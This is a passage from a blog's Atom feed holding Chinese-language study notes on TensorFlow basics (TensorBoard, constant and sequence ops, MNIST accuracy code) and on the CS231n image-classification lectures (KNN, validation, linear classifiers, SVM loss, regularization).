    _<span class="token punctuation">,</span> loss_batch<span class="token punctuation">,</span> logits_batch <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">,</span> logits<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> X_batch<span class="token punctuation">,</span> Y<span class="token punctuation">:</span> Y_batch<span class="token punctuation">}</span><span class="token punctuation">)</span>
    preds <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>softmax<span class="token punctuation">(</span>logits_batch<span class="token punctuation">)</span>
    correct_preds <span class="token operator">=</span> tf<span class="token punctuation">.</span>equal<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>preds<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>Y_batch<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    accuracy <span class="token operator">=</span> tf<span class="token punctuation">.</span>reduce_sum<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>correct_preds<span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># similar to numpy.count_nonzero(boolarray) :(</span>
    total_correct_preds <span class="token operator">+=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>accuracy<span class="token punctuation">)</span>
    <span class="token keyword">print</span>   <span class="token string">"Accuracy {0}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>total_correct_preds <span class="token operator">/</span> MNIST<span class="token punctuation">.</span>test<span class="token punctuation">.</span>num_examples<span class="token punctuation">)</span>
</code></pre>
<h5 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h5><p>lecture 3 学习了线性回归和逻辑回归，官方笔记里有一些坑，或多或少填完了这个坑，争取在考研的过程中能把这门课和cs229过一遍。</p>
]]></content>
    
    <summary type="html">
    
      CS 20SI: Tensorflow的Deep Learning研究笔记(二)
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>CS231n 回顾与思考(一)</title>
    <link href="http://xinqiu.me/2017/02/10/CS231n-1/"/>
    <id>http://xinqiu.me/2017/02/10/CS231n-1/</id>
    <published>2017-02-09T16:00:00.000Z</published>
    <updated>2017-03-05T14:21:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>大三上学期突然入了深度学习的坑，明明还没从机器学习CS229的坑里爬出来就先放一边去了，有空还要去把机器学习的坑填上。当初学的时候忘了做笔记，因为做MIT6.828，结果CS231n有点忘了，现在来补一补笔记。</p>
</blockquote>
<h2 id="u56FE_u50CF_u5206_u7C7B"><a href="#u56FE_u50CF_u5206_u7C7B" class="headerlink" title="图像分类"></a>图像分类</h2><p>在学习 CS231n 的一开始，先介绍了图像分类的相关知识。首先图像一般是由3个颜色通道构成(红，绿，蓝)，所以一张图片一般是个三维数组。图像分类有很多挑战，常见的是图像的拍摄点存在不同，图像的大小，物体的变形，光照影响，和背景颜色类似，同一物体的多种外形等等。所以其中有一种最简单的思路——最近邻分类器。</p>
<a id="more"></a>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<h3 id="u6700_u8FD1_u90BB_u5206_u7C7B_u5668"><a href="#u6700_u8FD1_u90BB_u5206_u7C7B_u5668" class="headerlink" title="最近邻分类器"></a>最近邻分类器</h3><p>这是一个最基础的分类器。比如，使用 CIFAR-10 这个图像数据集，这个数据集是有 10 种类型的不同图片组成。训练集中每一类都有5000张不同图像，每张图片是32x32的大小。最近邻分类器的简单思路就是判断两张图片的近似程度。这里用到了一个公式 <strong>L1 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})=\sum_{p} \left| I^p_1 - I^p_2 \right| $$ </p>
<p>两个图片对于每个像素进行相减取绝对值，然后将这些值求和，得到整个图片的 L1 距离。以下是一个4x4的例子。</p>
<p><img src="http://cs231n.github.io/assets/nneg.jpeg" alt=""></p>
<p>对于要分类的那张未知类的图像，只需要求它与训练集里其他图像的 L1 距离，找到距离最近的图像，就认为未知类的图像是这个距离最近的图像的种类。</p>
<p>对于距离的选择，还有一个公式—— <strong>L2 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})= \sqrt{\sum_{p} \left( I^p_1 - I^p_2 \right)^2} $$</p>
<h3 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h3><p>KNN 思路是找出最相似的 k 个图片的标签，然后取这 k 个中相同标签最多的那个标签。上面的 NN 其实就是 k = 1 的情况。</p>
<iframe src="http://nbviewer.jupyter.org/github/xinqiu/learn-cs231n/blob/master/assignment1/knn.ipynb" width="100%" height="800" scrolling="yes"></iframe>

<h3 id="u9A8C_u8BC1_u96C6"><a href="#u9A8C_u8BC1_u96C6" class="headerlink" title="验证集"></a>验证集</h3><p>对于如何确定超参数，只能通过不停的调试。为了先确定超参数以便预测测试集，可以使用验证集的思路。在训练的时候，不能用测试集来训练模型参数，那样会过拟合。使用验证集的思路是:从训练集中选取一部分当做假的测试集，通过剩余的训练集来训练模型，与假的测试集进行计算准确度，准确度最高的那个超参数可以算是较为合适的超参数。</p>
<p>之后就有一种方法，交叉验证。这是将训练集均分为几份，其中一份为测试集，剩余的作为训练集进行训练，得出准确率。将这些准确率取平均值代表平均准确率。</p>
<h3 id="u7EBF_u6027_u5206_u7C7B_u5668"><a href="#u7EBF_u6027_u5206_u7C7B_u5668" class="headerlink" title="线性分类器"></a>线性分类器</h3><p>然而用 NN 来做图片分类还是太麻烦了，所以为了简化计算量，引入了评分函数和损失函数，用来量化图片分类与真实标签的相似程度。</p>
<p>线性分类器就是 </p>
<p>$$ f(x_i, W, b) =  W x_i + b $$</p>
<p>其中 $ x_i $ 是训练集中的图片，<strong>W</strong> 是权重， <strong>b</strong> 是偏移量。对于训练集中的每一张图片，都要它的真实标签 $y_i$。所以就变成需要靠训练集的训练来调出最合适的 W 和 b，使得这个线性分类器 f 能对任意输入的一个图片进行计算操作，得到一个预测的值，预测值与真实值越近越好。</p>
<p>用一张简单的图例就是 </p>
<p><img src="http://cs231n.github.io/assets/imagemap.jpg" alt=""></p>
<p>对于 W 和 b，有一个小技巧，是将 b 添加到 W 中去，使 W 多一列，这样可以简化运算。</p>
<p><img src="http://cs231n.github.io/assets/wb.jpeg" alt=""></p>
<p>以上内容也不是很难，下面才开始有点难度。</p>
<h3 id="u635F_u5931_u51FD_u6570"><a href="#u635F_u5931_u51FD_u6570" class="headerlink" title="损失函数"></a>损失函数</h3><p>上面提到了线性分类器，同样也算是损失函数的计算。只有当 W 和 b 是调好参数的时候，才能作为分类器，不然只能作为得分函数来看。所以 $ f(x_i, W, b) $ 也就是所谓的得分函数。对于得到的得分，需要一个损失函数来量化与正确值之间的差异程度。</p>
<h3 id="u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931"><a href="#u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931" class="headerlink" title="多类支持向量机损失"></a>多类支持向量机损失</h3><p>SVM的损失函数是在所有正确分类的得分和不正确分类的得分中确定出一个边界差 $\Delta$。之前提到过，第 $i$ 个数据包含图像 $x_i$ 的像素和代表正确标签的 $y_i$。就数据集 CIFAR-10 而言，类别有10种，所以 $ f(x_i, W, b) $ 计算能得出对于10个类的分别得分，正确的是在类 $i$ ，错误的类标签就是 $j$。那么对于第$j$类的得分就是第$j$个元素：$s_j = f(x_i, W)_j$。根据概念，可以得出 SVM 的损失函数</p>
<p>$$ L_{i} = \sum_{j\neq y_{i}} \max(0, s_{j} - s_{y_{i}} + \Delta) $$</p>
<p>这个函数简而言之就是给定超参数 $\Delta$ 后，所有错误类别的得分减正确类别得分加上 $\Delta$ 之和就是损失值。这里的 $max(0, -)$ 不能遗漏。$max$ 得 0 的意义代表取的超参数 $\Delta$ 是可行的，而不得 0 代表 $\Delta$ 还有点大。</p>
<p>所以使用线性得分函数 $(f(x_i; W) =  W x_i)$ 的 SVM 损失函数就是 </p>
<p>$$ L_{i}=\sum_{j\neq y_{i}} \max(0, w_{j}^{T} x_{i} - w_{y_{i}}^T x_{i} + \Delta)  $$</p>
<p>这里 $w_j$ 是 $W$ 的 第 $j$ 行变形得到的列向量。</p>
<p>所以 SVM 就是为了先计算出合适的 $\Delta$，之后就能用来分类了。下图描述了正确类与错误类之间的差距关系。</p>
<p><img src="http://cs231n.github.io/assets/margin.jpg" alt=""></p>
<h3 id="u6B63_u5219_u5316"><a href="#u6B63_u5219_u5316" class="headerlink" title="正则化"></a>正则化</h3><p>正则化，也就是regularization，是为了避免在训练权重的时候过拟合，这里算是历史原因导致的约定俗成。最常见的是 L2 范式。这是在原本的 Loss 函数后加上正则化惩罚函数，这个惩罚函数是</p>
<p>$$ R(W) = \sum_{k}\sum_{l} W_{k,l}^2 $$</p>
<p>所以完整的 SVM 函数就是</p>
<p>$$ L =  \underbrace{ \frac{1}{N} \sum_{i} L_{i} }_\text{data loss} + \underbrace{ \lambda R(W) }_\text{regularization loss} \\ $$</p>
<p>详细点就是</p>
<p>$$ L = \frac{1}{N} \sum_{i} \sum_{j\neq y_{i}} \left[ \max(0, f(x_{i}; W)_{j} - f(x_{i}; W)_{y_{i}} + \Delta) \right] + \lambda \sum_{k}\sum_{l} W_{k,l}^2 $$</p>
<p>这个 $ N $ 就是训练样本的数量。这里也有个超参数 $ \lambda $，当然可以和上面类似，用交叉验证来得到合适的值。</p>
<iframe src="http://nbviewer.jupyter.org/github/xinqiu/learn-cs231n/blob/master/assignment1/svm.ipynb" width="100%" height="800" scrolling="yes"></iframe>


]]></content>
    
    <summary type="html">
    
      回顾当初学习CS231n的知识
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow for Deep Learning 2</title>
    <link href="http://xinqiu.me/2017/02/02/cs20si-2/"/>
    <id>http://xinqiu.me/2017/02/02/cs20si-2/</id>
    <published>2017-02-01T16:00:00.000Z</published>
    <updated>2017-03-31T09:23:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>笔记2: TensorFlow Ops</p>
</blockquote>
<h3 id="u4F7F_u7528_TensorBoard"><a href="#u4F7F_u7528_TensorBoard" class="headerlink" title="使用 TensorBoard"></a>使用 TensorBoard</h3><p>TensorFlow 中将常量(constants),变量(variables),运算符(operators)合称为操作(ops)。TensorFlow 是由TensorFlow, TensorBoard, TensorServing 构成。首先介绍 TensorBoard。</p>
<p>TensorBoard 是图可视化软件。</p>
<p><img src="https://www.tensorflow.org/versions/master/images/mnist_tensorboard.png" alt=""></p>
<p>当用户运行开启 TensorBoard 的 TensorFlow 程序，所有操作会输出到一个事件文件。TensorBoard 能将这些文件转为图，使模型更直观。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
</code></pre>
<p>开启 TensorBoard 只需要在运行程序的代码前添加 </p>
<p><code>writer = tf.summary.FileWriter(logs_dir,sess.graph)</code></p>
<p>其中 logs_dir 是事件文件的存放位置，比如’./graphs’。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./graphs'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># close the writer when you’re done using it</span>
writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>在执行完上述代码以后，使用 <code>tensorboard --logdir=&quot;./graphs&quot;</code>，之后打开浏览器访问 h  ttp://localhost:6006/ 就能看到以下页面。 建议使用 Chrome 访问。</p>
<p><img src="1.png" alt=""></p>
<p>点击导航上的 Graphs 可以看到</p>
<center><img src="2.png" alt=""></center>

<p>“Const” 和 “Const_1” 对应代码中的 a 和 b， “Add” 对应 x。这样很不直观，所以为了让 TensorBoard 显示 操作(ops) 的名字，可以准确定义每个变量。</p>
<pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"a"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"add"</span><span class="token punctuation">)</span>
</code></pre>
<p>这时候 TensorBoard 中的图就是这样：</p>
<center><img src="3.png" alt=""></center>

<p>图本身只定义了操作和操作来源，但不显示值。只有在运行session时才会去获取值。</p>
<p><code>tf.Session.run(fetches, feed_dict=None, options=None, run_metadata=None)</code></p>
<h3 id="u5E38_u91CF"><a href="#u5E38_u91CF" class="headerlink" title="常量"></a>常量</h3><p>创建标量或者张量(tensor)类型的常量。</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span>value<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> shape<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Const'</span><span class="token punctuation">,</span> verify_shape<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># constant of 1d tensor (vector)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># constant of 2x2 tensor (matrix)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">)</span>
</code></pre>
<p>创建由特定值构成的张量。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and all elements are zeros</span>
tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span>  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are zeros.</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span> optimize<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># input_tensor is [0, 1], [2, 3], [4, 5]]</span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and all elements are ones</span>
tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>int32<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span>  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are ones.</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">,</span> optimize<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># input_tensor is [0, 1], [2, 3], [4, 5]]</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>input_tensor<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a tensor filled with a scalar value.</span>
tf<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>dims<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<p>创建常数序列</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a sequence of  num evenlyspaced values are generated beginning at  start. If num > 1, the values in the sequence increase by stop - start / num - 1, so that the last one is exactly  stop.</span>
<span class="token comment" spellcheck="true"># start, stop, num must be scalars</span>
<span class="token comment" spellcheck="true"># comparable to but slightly different from numpy.linspace</span>
<span class="token comment" spellcheck="true"># numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)</span>
tf<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> num<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">13.0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"linspace"</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">10</span><span class="token punctuation">.</span>  <span class="token number">11</span><span class="token punctuation">.</span>  <span class="token number">12</span><span class="token punctuation">.</span>  <span class="token number">13</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a sequence of numbers that begins at start and extends by increments of delta up to but not including limit</span>
<span class="token comment" spellcheck="true"># slight different from range in Python</span>
tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token operator">=</span>None<span class="token punctuation">,</span> delta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'range'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 'start' is 3, 'limit' is 18, 'delta' is 3</span>

tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token punctuation">,</span> delta<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">9</span> <span class="token number">12</span> <span class="token number">15</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># 'start' is 3, 'limit' is 1, 'delta' is -0.5</span>

tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> limit<span class="token punctuation">,</span> delta<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">.</span>   <span class="token number">2.5</span>  <span class="token number">2</span><span class="token punctuation">.</span>   <span class="token number">1.5</span><span class="token punctuation">]</span>



<span class="token comment" spellcheck="true"># 'limit' is 5</span>
tf<span class="token punctuation">.</span>range<span class="token punctuation">(</span>limit<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span><span class="token punctuation">]</span>
</code></pre>
<p>值得注意的是，不像NumPy，TensorFlow的序列是不可迭代的</p>
<p>tf也提供了生成确定分布的随机常量的函数。</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>random_normal<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> mean<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> mean<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">,</span> stddev<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_uniform<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> minval<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> maxval<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>dtypes<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_shuffle<span class="token punctuation">(</span>value<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_crop<span class="token punctuation">(</span>value<span class="token punctuation">,</span> size<span class="token punctuation">,</span>seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>multinomial<span class="token punctuation">(</span>logits<span class="token punctuation">,</span> num_samples<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>

tf<span class="token punctuation">.</span>random_gamma<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> beta<span class="token operator">=</span>None<span class="token punctuation">,</span> dtype<span class="token operator">=</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> seed<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<h3 id="u6570_u5B66_u8FD0_u7B97"><a href="#u6570_u5B66_u8FD0_u7B97" class="headerlink" title="数学运算"></a>数学运算</h3><p>TensorFlow 的数学运算和 NumPy 非常类似。直接看 <a href="https://www.tensorflow.org/api_docs/python/math_ops/" target="_blank" rel="external">Math API</a> 吧。</p>
<h3 id="u6570_u636E_u7C7B_u578B"><a href="#u6570_u636E_u7C7B_u578B" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="Python__u539F_u751F_u7C7B_u578B"><a href="#Python__u539F_u751F_u7C7B_u578B" class="headerlink" title="Python 原生类型"></a>Python 原生类型</h4><p>看下面的例子就能懂了。</p>
<pre class=" language-python"><code class="language-python">t_0 <span class="token operator">=</span> <span class="token number">19</span>  <span class="token comment" spellcheck="true"># Treated as a 0-d tensor, or "scalar" </span>
tf<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>t_0<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 0</span>
tf<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>t_0<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ==> 1</span>

